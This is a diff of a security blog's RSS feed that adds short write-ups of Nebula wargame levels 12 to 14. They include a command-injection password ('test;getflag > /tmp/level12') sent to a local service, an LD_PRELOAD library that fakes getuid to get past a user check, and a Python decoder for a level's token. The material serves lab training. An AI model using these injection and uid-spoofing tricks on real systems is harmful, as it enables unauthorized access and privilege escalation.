@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 29 May 2016 19:20:22 +0800</pubDate>
-    <lastBuildDate>Sun, 29 May 2016 19:20:22 +0800</lastBuildDate>
+    <pubDate>Mon, 30 May 2016 19:21:52 +0800</pubDate>
+    <lastBuildDate>Mon, 30 May 2016 19:21:52 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -370,7 +370,6 @@ link knowledge:
 
     however,when I first didn&#39;t add &quot;chmod +x /tmp/echo&quot; in &quot;mykey&quot;,I thought may be there exists some error in level01,and tried to change the source code of /home/flag01/flag01 to file.c:
 
-    -------------content of file.c----------
     #include &amp;lt;stdlib.h&amp;gt;
     #include &amp;lt;unistd.h&amp;gt;
     #include &amp;lt;string.h&amp;gt;
@@ -568,14 +567,51 @@ link knowledge:
     there are two ways:
         (http://blackndoor.com/nebula-level11/)
         (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
-    
-    |way1|
-    ----------way1-----------
-    ----------end------------
-    
-    |way2|
-    ----------way2-----------
-    -----------end-----------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x12-level12&quot;&gt;0x12 level12&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    nc 127.0.0.1 50001
+    Pass:
+        test;getflag &amp;gt; /tmp/level12
+    vi /tmp/level12
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x13-level13&quot;&gt;0x13 level13&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    vi /tmp/level13.c
+    -----content-------
+    #include &amp;lt;sys/types.h&amp;gt;
+    int getuid(void)
+    {
+        return 1000; 
+    }
+    -------------------
+    gcc -shared -fPIC /tmp/level13.c -o /tmp/level13.so
+    LD_PRELOAD=&quot;/tmp/level13.so&quot;
+    export LD_PRELOAD
+    cp /home/flag13/flag13 /home/level13/
+    /home/level13/flag13
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x14-level14&quot;&gt;0x14 level14&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+--------py--------
+def main(string):
+    length=len(string)
+    out=&quot;&quot;
+    for i in range(length):
+	#print type(chr(ord(string[length-1-i])-(length-1-i)))
+	#print chr(ord(string[length-1-i])-(length-1-i))[0]
+        out+=(chr(ord(string[length-1-i])-(length-1-i))[0])
+    return out
+if __name__==&#39;__main__&#39;:
+    import sys
+    print main(sys.argv[1])
+------------------
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
